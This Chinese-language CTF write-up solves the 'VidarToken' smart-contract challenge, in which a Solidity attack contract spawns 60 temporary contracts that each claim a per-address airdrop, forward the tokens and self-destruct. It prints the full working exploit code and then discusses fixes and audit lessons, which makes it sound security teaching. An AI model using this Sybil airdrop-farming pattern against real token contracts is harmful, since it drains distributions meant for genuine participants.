# VidarToken

## 题目简述

目标合约提供 `airdrop()`、`transfer()` 和 `solve()`。空投按调用地址限制领取次数，而 `solve()` 要求调用者持有足够多的 VidarToken。单个地址无法重复领取，但合约并没有把“同一玩家”与一个固定地址绑定，因此可以在一笔交易中创建许多临时合约，让每个新地址各领一次空投，再把代币集中到攻击合约。

官方题解没有保留目标合约的完整源码、具体余额阈值或动态环境最终 flag，但保留的攻击合约足以还原漏洞原理和利用流程。

## 解题过程

`airdrop()` 防重放的对象是 `msg.sender`。在 EVM 中，每次执行 `new MiniHacker(...)` 都会部署一个具有独立地址的新合约；目标合约看到的调用者是这个新地址，而不是最外层的玩家地址。因此每个临时合约都能通过一次“从未领取过”的检查。

临时合约在构造函数中完成三件事：

1. 调用 `airdrop()`，让当前临时地址取得 10 枚代币；
2. 把这 10 枚代币转给部署它的攻击合约；
3. 执行 `selfdestruct`，不再保留无用的临时代码和状态。

攻击合约循环部署 60 个临时合约后，余额被集中到同一个地址，最后由该地址调用 `solve()`。完整攻击代码如下：

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

interface IVidarToken {
    function airdrop() external;

    function transfer(address to, uint256 amount) external;

    function solve() external;
}

contract MiniHacker {
    constructor(address victimAddress) {
        IVidarToken victim = IVidarToken(victimAddress);

        victim.airdrop();
        victim.transfer(msg.sender, 10);

        selfdestruct(payable(msg.sender));
    }
}

contract Attack {
    IVidarToken public immutable victim;

    constructor(address victimAddress) {
        victim = IVidarToken(victimAddress);
    }

    function hack() external {
        for (uint256 i = 0; i < 60; ++i) {
            new MiniHacker(address(victim));
        }

        victim.solve();
    }
}
```

部署时把题目实例的目标合约地址传给 `Attack`，随后调用一次 `hack()` 即可把“批量领取、归集、验收”放在同一笔交易中完成。

官方题解还指出一个非预期：如果 `airdrop()` 取得的代币允许自由转账，玩家也可以手工控制多个地址，逐个领取后转给最终地址。出题人的本意是一笔交易内使用临时合约完成，因此更稳妥的修复不只是把 `solve()` 阈值调高，而应让资格不可转移、使用签名或 Merkle proof 把领取权绑定到真实参与者，或者在题目模型中明确接受 Sybil 地址不可区分这一事实。

## 方法总结

本题考查的是按地址限领机制的 Sybil 绕过。`mapping(address => bool)` 只能证明某个地址是否领取过，不能证明多个地址是否属于同一控制者。EVM 中可以在一次交易里批量创建合约地址，这使“每地址一次”尤其脆弱。审计空投和白名单逻辑时，应同时检查领取资产能否转移、验收是否只看聚合余额，以及攻击者创建新地址的成本是否足够低。
